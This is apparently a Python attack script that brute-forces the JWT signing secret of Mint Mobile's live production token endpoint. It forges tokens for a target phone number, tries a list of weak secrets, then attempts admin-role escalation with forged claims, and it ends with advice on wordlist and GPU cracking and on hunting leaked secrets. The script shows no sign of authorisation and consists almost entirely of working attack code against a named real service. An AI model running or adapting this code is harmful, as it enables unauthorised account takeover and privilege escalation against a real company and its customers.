#!/usr/bin/env python3
"""
Mint Mobile - JWT SECRET CRACKING
==================================
Based on the Medium article technique

The hardcoded "secret" doesn't work, but maybe there's a REAL
weak secret being used in production. Let's crack it!

Technique from: https://medium.com/bugbountywriteup/...
"""

import jwt
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

print("""
╔══════════════════════════════════════════════════════════════════╗
║  JWT SECRET BRUTE FORCE - Mint Mobile                          ║
║  Based on real bug bounty technique                            ║
╚══════════════════════════════════════════════════════════════════╝
""")

# Common JWT secrets from real bug bounties
COMMON_SECRETS = [
    "secret", "secret123", "password", "password123", "admin", "admin123",
    "jwt", "jwt123", "token", "token123", "key", "key123",
    "mintmobile", "mint", "mobile", "ultramobile", "ultra",
    "secret_key", "jwt_secret", "api_key", "auth_key",
    "12345", "123456", "1234567", "12345678", "123456789",
    "qwerty", "abc123", "letmein", "welcome", "monkey",
    "secret@123", "admin@123", "root", "toor", "pass",
    "", "null", "undefined", "test", "demo", "dev", "prod",
    "mintmobile123", "ultra123", "mobile123", "ryan", "reynolds"  # CEO name
]

# Target phone number for testing
TARGET_PHONE = "+15551234567"

def test_secret(secret, phone=TARGET_PHONE):
    """Test if a secret works by signing a JWT and checking server response"""
    
    payload = {
        "msisdn": phone,
        "sub": phone,
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400
    }
    
    try:
        # Try to sign with this secret
        token = jwt.encode(payload, secret, algorithm="HS256")
        
        # Test against production
        response = requests.post(
            "https://my.mintmobile.com/api/token",
            json={"autoLoginToken": token},
            headers={"Authorization": f"Bearer {token}"},
            timeout=5
        )
        
        # Success indicators
        if response.status_code == 200:
            return True, secret, response.status_code, "✅ SUCCESS!"
        elif response.status_code == 201:
            return True, secret, response.status_code, "✅ SUCCESS!"
        elif response.status_code == 401:
            return False, secret, response.status_code, "Invalid token (wrong secret)"
        elif response.status_code == 403:
            return False, secret, response.status_code, "Forbidden (might be right secret, wrong perms)"
        else:
            return False, secret, response.status_code, f"Other: {response.status_code}"
            
    except Exception as e:
        return False, secret, 0, f"Error: {str(e)[:50]}"

def test_admin_role(secret, phone=TARGET_PHONE):
    """Test admin role escalation like in the Medium article"""
    
    # Try various admin payloads
    admin_payloads = [
        {"msisdn": phone, "sub": phone, "role": "admin"},
        {"msisdn": phone, "sub": phone, "role": "administrator"},
        {"msisdn": phone, "sub": phone, "isAdmin": True},
        {"msisdn": phone, "sub": phone, "admin": True},
        {"msisdn": phone, "sub": phone, "role": "superuser"},
        {"msisdn": phone, "sub": phone, "privileges": ["admin"]},
    ]
    
    for payload in admin_payloads:
        payload["iat"] = int(time.time())
        payload["exp"] = int(time.time()) + 86400
        
        try:
            token = jwt.encode(payload, secret, algorithm="HS256")
            
            response = requests.post(
                "https://my.mintmobile.com/api/token",
                json={"autoLoginToken": token},
                headers={"Authorization": f"Bearer {token}"},
                timeout=5
            )
            
            if response.status_code in [200, 201]:
                return True, payload, response
                
        except:
            pass
    
    return False, None, None

print("[*] Starting JWT secret brute force...")
print(f"[*] Testing {len(COMMON_SECRETS)} common secrets")
print(f"[*] Target: https://my.mintmobile.com/api/token\n")

# Test secrets with threading for speed
results = []

with ThreadPoolExecutor(max_workers=5) as executor:
    futures = {executor.submit(test_secret, secret): secret for secret in COMMON_SECRETS}
    
    for i, future in enumerate(as_completed(futures), 1):
        secret = futures[future]
        success, test_secret, status, message = future.result()
        
        # Show progress
        if i % 10 == 0:
            print(f"[*] Progress: {i}/{len(COMMON_SECRETS)} tested...")
        
        if success:
            print(f"\n{'='*70}")
            print(f"🎉 FOUND WORKING SECRET: '{test_secret}'")
            print(f"{'='*70}")
            print(f"Status Code: {status}")
            print(f"Message: {message}\n")
            
            # Try admin escalation
            print("[*] Testing admin role escalation...")
            admin_success, admin_payload, admin_response = test_admin_role(test_secret)
            
            if admin_success:
                print("🚨 CRITICAL: ADMIN ROLE ESCALATION WORKS!")
                print(f"Payload: {admin_payload}")
                print(f"Response: {admin_response.text[:200]}")
            
            results.append({
                "secret": test_secret,
                "status": status,
                "admin_escalation": admin_success
            })
        elif status not in [403]:  # Log interesting responses
            print(f"[!] Interesting: secret='{test_secret}' -> {status} ({message})")

print("\n" + "="*70)
print("RESULTS")
print("="*70)

if results:
    print(f"\n✅ Found {len(results)} working secret(s)!")
    for r in results:
        print(f"\nSecret: '{r['secret']}'")
        print(f"Status: {r['status']}")
        print(f"Admin Escalation: {'YES!' if r['admin_escalation'] else 'No'}")
else:
    print("\n❌ No working secrets found")
    print("\nThis means:")
    print("1. The production secret is NOT weak/common")
    print("2. The server uses a different secret than 'secret'")
    print("3. Need to try more advanced cracking (rockyou.txt)")
    print("4. Or the server validates tokens properly (good security!)")

print("\n[*] Next steps:")
print("1. Try with rockyou.txt wordlist (14M passwords)")
print("2. Use john or hashcat for GPU-accelerated cracking")
print("3. Look for leaked secrets in GitHub/config files")
print("4. Test other endpoints that might use JWT")

print("\n" + "="*70)
